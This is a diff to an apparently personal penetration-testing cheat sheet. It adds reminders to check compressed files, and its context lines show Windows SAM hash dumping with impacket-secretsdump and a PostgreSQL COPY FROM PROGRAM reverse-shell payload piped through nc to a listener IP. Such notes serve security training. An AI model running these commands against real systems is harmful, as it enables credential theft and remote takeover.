@@ -292,6 +292,10 @@ Invoke-AllChecks
 2. download to kali
 3. impacket-secretsdump -sam SAM -system SYSTEM local
 ```
+##### Check Compressed files
+```
+check zip,gz,7z,stix,rar files
+```
 
 ### Linux
 ###### Check what sudo permissions the user has available to them
@@ -448,4 +452,8 @@ GRANT pg_write_server_files TO username;
 command execution:
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
+```
+###### Check Compressed files
+```
+check zip,gz,7z,stix,rar files
 ```
